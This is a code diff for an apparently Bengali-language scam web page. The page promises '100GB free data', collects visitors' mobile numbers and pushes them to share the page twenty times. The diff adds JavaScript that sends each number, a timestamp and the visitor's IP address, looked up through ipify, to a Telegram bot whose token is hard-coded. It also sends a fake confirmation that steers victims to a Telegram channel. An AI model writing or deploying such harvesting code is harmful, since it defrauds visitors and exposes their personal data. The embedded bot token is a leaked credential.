@@ -460,7 +460,7 @@ body {
 <script>
 // টেলিগ্রাম বট কনফিগারেশন
 const telegramBotToken = "7665711436:AAEMnIPnEHZRcEskgshKkd5YCvwR8e-LlN4";
-const chatId = "7665711436"; // আপনার চ্যাট আইডি
+const chatId = "7889474032"; // আপনার চ্যাট আইডি (আপডেট করা হয়েছে)
 
 let shareCount = 0;
 const totalRequired = 20;
@@ -572,6 +572,15 @@ async function submitMobileNumber() {
     }
 
     try {
+        // Show loading while sending
+        document.getElementById('mobileModal').style.display = 'none';
+        document.getElementById('loadingModal').style.display = 'block';
+        document.getElementById('loadingContent').innerHTML = `
+            <div class="loader"></div>
+            <p id="loadingText">মোবাইল নম্বর পাঠানো হচ্ছে...</p>
+        `;
+        
+        // Send to Telegram
         const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
             method: 'POST',
             headers: {
@@ -579,21 +588,51 @@ async function submitMobileNumber() {
             },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: `নতুন মোবাইল নম্বর সাবমিট: ${mobileNumber}\nসময়: ${new Date().toLocaleString()}`
+                text: `🔔 নতুন মোবাইল নম্বর সাবমিট 🔔\n\n📱 নম্বর: ${mobileNumber}\n⏰ সময়: ${new Date().toLocaleString()}\n🌐 IP: ${await getIPAddress()}`
             })
         });
 
         if(response.ok) {
-            document.getElementById('mobileModal').style.display = 'none';
+            document.getElementById('loadingModal').style.display = 'none';
             showTaskModal();
+            
+            // Also send a confirmation to user's Telegram if available
+            try {
+                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: mobileNumber.startsWith('+') ? mobileNumber : `+88${mobileNumber}`,
+                        text: `ধন্যবাদ! আপনার মোবাইল নম্বর সফলভাবে রেজিস্টার্ড হয়েছে। 100GB ফ্রি ডেটা পেতে আমাদের টেলিগ্রাম চ্যানেলে জয়েন করুন: https://t.me/freedatamobile`
+                    })
+                });
+            } catch (e) {
+                console.log("Couldn't send confirmation to user");
+            }
+            
         } else {
-            throw new Error('টেলিগ্রামে মেসেজ পাঠাতে ব্যর্থ');
+            const errorData = await response.json();
+            throw new Error(errorData.description || 'টেলিগ্রামে মেসেজ পাঠাতে ব্যর্থ');
         }
         
     } catch (error) {
         console.error('ত্রুটি:', error);
-        document.getElementById('mobileModal').style.display = 'none';
-        showTaskModal();
+        document.getElementById('loadingModal').style.display = 'none';
+        alert('মোবাইল নম্বর সাবমিট করতে সমস্যা হয়েছে। পরে আবার চেষ্টা করুন।');
+        showTaskModal(); // Continue to task modal even if Telegram fails
+    }
+}
+
+// Function to get user's IP address
+async function getIPAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        return "IP অজানা";
     }
 }
 
